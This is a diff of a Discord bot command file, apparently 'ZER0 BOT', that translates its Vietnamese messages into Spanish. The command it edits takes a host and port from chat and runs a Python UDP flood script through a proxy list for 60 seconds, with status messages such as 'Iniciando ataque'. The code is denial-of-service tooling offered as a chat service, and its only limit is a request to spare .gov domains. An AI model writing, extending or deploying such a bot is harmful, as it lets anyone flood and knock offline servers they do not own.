@@ -14,9 +14,9 @@ if (message.channel.id != room) {
 if(!args[0]) {
 	const embed1 = new Discord.MessageEmbed()
 	.setColor('RANDOM')
-	.setTitle('CẢNH BÁO')
-	.setDescription("`Mẫu ;udp 1.1.1.1:80`")
-	.setFooter("Vui lòng không tấn công các website có domain .gov")
+	.setTitle('⚠️ ADVERTENCIA')
+	.setDescription("`Formato ;udp 1.1.1.1:80`")
+	.setFooter("Por favor no ataque sitios web con dominio .gov")
 	message.channel.send(embed1);
 	return;
 	}
@@ -25,14 +25,14 @@ var exec = require('child_process').exec
 exec(`python3 start.py UDP ${host}:${port} 1000 60 0 proxy.txt`, (error, stdout, stderr) => {
 });
 setTimeout(function(){ 
-    console.log('Cuộc tấn công đã dừng lại ID Discord:' +  message.guild.id)
+    console.log('Ataque detenido ID Discord:' +  message.guild.id)
 
 
 const embed = new Discord.MessageEmbed()
 	.setColor('RANDOM')
 	.setTitle('🔥 **ZER0 BOT** 🔥')
 	.setTimestamp()
-	.setDescription("**► Cuộc tấn công đã kết thúc 💥**")
+	.setDescription("**► ¡Ataque finalizado 💥**")
 	.setFooter('© Developer: zxcr9999#1770', client.user.avatarURL)
 	.setTimestamp()
 	.setThumbnail("")
@@ -40,14 +40,14 @@ const embed = new Discord.MessageEmbed()
  }, 120000); //time in milliseconds
 var gifler = ["https://media.giphy.com/media/3o7aDdSjGlUbmwFCQo/giphy.gif", "https://media.giphy.com/media/3o7aDdSjGlUbmwFCQo/giphy.gif", "https://media.giphy.com/media/3o7aDdSjGlUbmwFCQo/giphy.gif" , "https://media.giphy.com/media/3o7aDdSjGlUbmwFCQo/giphy.gif"];
     var randomgif = gifler[Math.floor((Math.random() * gifler.length))];
-console.log('Start Attacking ID Discord:' +  message.guild.id)
+console.log('Iniciando ataque ID Discord:' +  message.guild.id)
 
 
 const embed = new Discord.MessageEmbed()
 	.setColor('RANDOM')
 	.setTitle('🔥 **ZER0 BOT** 🔥')
 	.setTimestamp()
-	.setDescription("**Người Dùng**: `" + message.author.username + "` \n **Máy Chủ**: `" + host + "` \n **Cổng**: `" + port + "` \n **Phương Thức**: `NTP 💥` \n **Thời gian**: `60 giây 🕒`")
+	.setDescription("**Usuario**: `" + message.author.username + "` \n **Servidor**: `" + host + "` \n **Puerto**: `" + port + "` \n **Método**: `UDP 💥` \n **Tiempo**: `60 segundos 🕒`")
 	.setFooter('© Developer: zxcr9999#1770', client.user.avatarURL)
 	.setTimestamp()
 	.setImage(randomgif)
